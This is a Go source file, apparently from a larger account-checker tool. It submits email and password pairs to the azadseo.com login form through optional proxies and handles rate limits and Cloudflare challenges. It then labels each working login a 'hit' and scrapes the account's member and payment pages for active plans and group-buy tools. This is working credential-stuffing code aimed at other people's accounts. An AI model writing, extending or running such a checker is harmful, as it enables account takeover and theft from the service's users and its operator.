package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

var (
	azadGroupBuyAccessRE = regexp.MustCompile(`(?is)href=["'][^"']*/member/go/[^"']+["']`)
	azadGroupBuyToolRE   = regexp.MustCompile(`(?is)class=["'][^"']*(?:tool-title|tool-name|gb-tool|product-title)[^"']*["'][^>]*>([^<]{2,80})<`)
)

func (c *Checker) checkAzadseo(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}
	defer clearHTTPClientSession(client, c.cfg.BaseURL(), "https://azadseo.com")

	loginURL := c.cfg.LoginURL()
	referer := c.cfg.Var("login_referer", c.cfg.BaseURL()+"/login")

	loginBody, loginStatus, err := c.fetchURL(client, loginURL, map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache, no-store",
		"Pragma":          "no-cache",
		"User-Agent":      c.cfg.UserAgent,
	})
	if err != nil {
		status, reason := c.resultFromRequestErr("login page", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if loginStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login page HTTP 429")
		return result
	}
	if loginStatus != http.StatusOK {
		result.Status = StatusError
		result.Reason = fmt.Sprintf("login page HTTP %d", loginStatus)
		return result
	}
	if noxtoolsIsCloudflareChallenge(loginBody) {
		result.Status = StatusError
		result.Reason = "Cloudflare challenge on login page — try proxy or wait"
		return result
	}

	finalURL, postBody, postStatus, err := c.postAzadseoLogin(client, loginURL, email, password, referer)
	if err != nil {
		status, reason := c.resultFromRequestErr("login POST", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if postStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login POST HTTP 429")
		return result
	}

	if msg := parseNoxtoolsLoginError(postBody); msg != "" {
		lower := strings.ToLower(msg)
		if strings.Contains(lower, "wait") || strings.Contains(lower, "try again later") || strings.Contains(lower, "too many") {
			result.Status = StatusRateLimited
			result.Reason = msg
			return result
		}
		result.Status = StatusFail
		result.Reason = msg
		return result
	}

	if !azadseoLoginSucceeded(finalURL, postBody) {
		result.Status = StatusFail
		result.Reason = "login failed — still on sign-in page"
		return result
	}

	result.AccountEmail = email
	planInfo := c.fetchAzadseoPlanInfo(client)
	result.PlanName, result.PlanLabel = formatAzadseoPlanResult(planInfo)
	result.Status = StatusHit
	return result
}

func (c *Checker) postAzadseoLogin(client *http.Client, loginURL, email, password, referer string) (finalURL, body string, status int, err error) {
	form := url.Values{}
	form.Set("amember_login", email)
	form.Set("amember_pass", password)
	form.Set("_referer", referer)

	req, err := http.NewRequest(http.MethodPost, loginURL, strings.NewReader(form.Encode()))
	if err != nil {
		return "", "", 0, err
	}
	req.Header.Set("User-Agent", c.cfg.UserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache, no-store")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Origin", c.cfg.BaseURL())
	req.Header.Set("Referer", loginURL)

	resp, err := client.Do(req)
	if err != nil {
		return "", "", 0, err
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(io.LimitReader(resp.Body, 2<<20))
	if err != nil {
		return resp.Request.URL.String(), "", resp.StatusCode, err
	}
	return resp.Request.URL.String(), string(data), resp.StatusCode, nil
}

func azadseoLoginSucceeded(finalURL, body string) bool {
	if parseNoxtoolsLoginError(body) != "" {
		return false
	}
	u, err := url.Parse(finalURL)
	if err == nil {
		path := strings.ToLower(strings.TrimSuffix(u.Path, "/"))
		if path == "/member" || strings.HasPrefix(path, "/member/") {
			return true
		}
		if path == "/login" || strings.HasSuffix(path, "/login") {
			return false
		}
	}
	lower := strings.ToLower(body)
	if strings.Contains(lower, `name="amember_login"`) && strings.Contains(lower, "sign in") {
		return false
	}
	return !strings.Contains(lower, `name="amember_login"`)
}

func (c *Checker) fetchAzadseoPlanInfo(client *http.Client) noxtoolsPlanInfo {
	info := noxtoolsPlanInfo{}
	memberURL := c.cfg.Var("member_url", c.cfg.BaseURL()+"/member")
	memberBody, status, _, err := c.doRequest(client, "GET", memberURL, c.azadseoPageHeaders(c.cfg.BaseURL()+"/login"), "")
	if err == nil && status == http.StatusOK && !strings.Contains(strings.ToLower(memberBody), `name="amember_login"`) {
		visible := noxtoolsVisibleHTML(memberBody)
		info = parseNoxtoolsMemberPlans(visible)
		info = mergeAzadseoGroupBuyTools(info, visible)
	}
	if len(info.Active) == 0 {
		payURL := c.cfg.Var("payment_history_url", c.cfg.BaseURL()+"/member/payment-history")
		payBody, payStatus, _, payErr := c.doRequest(client, "GET", payURL, c.azadseoPageHeaders(memberURL), "")
		if payErr == nil && payStatus == http.StatusOK {
			payHTML := noxtoolsVisibleHTML(payBody)
			payInfo := parseNoxtoolsMemberPlans(payHTML)
			if len(payInfo.Active) > 0 {
				info.Active = payInfo.Active
				info.NoActive = false
			}
			if len(payInfo.Expired) > 0 && len(info.Expired) == 0 {
				info.Expired = payInfo.Expired
			}
			if payInfo.LastPaid != "" && info.LastPaid == "" && info.NoActive {
				info.LastPaid = payInfo.LastPaid
			}
		}
	}
	return info
}

func mergeAzadseoGroupBuyTools(info noxtoolsPlanInfo, body string) noxtoolsPlanInfo {
	if info.NoActive || len(info.Active) > 0 {
		return info
	}
	if !azadGroupBuyAccessRE.MatchString(body) {
		return info
	}
	seen := map[string]struct{}{}
	for _, name := range info.Active {
		seen[strings.ToLower(name)] = struct{}{}
	}
	for _, m := range azadGroupBuyToolRE.FindAllStringSubmatch(body, -1) {
		name := strings.TrimSpace(noxtoolsStripHTML(m[1]))
		if name == "" || isNoxtoolsNoisePlan(name) {
			continue
		}
		key := strings.ToLower(name)
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		info.Active = append(info.Active, name)
	}
	if len(info.Active) > 0 {
		info.NoActive = false
	}
	return info
}

func (c *Checker) azadseoPageHeaders(referer string) map[string]string {
	return map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache, no-store",
		"Pragma":          "no-cache",
		"User-Agent":      c.cfg.UserAgent,
		"Referer":         referer,
	}
}

func formatAzadseoPlanResult(info noxtoolsPlanInfo) (planName, planLabel string) {
	return formatNoxtoolsPlanResult(info)
}
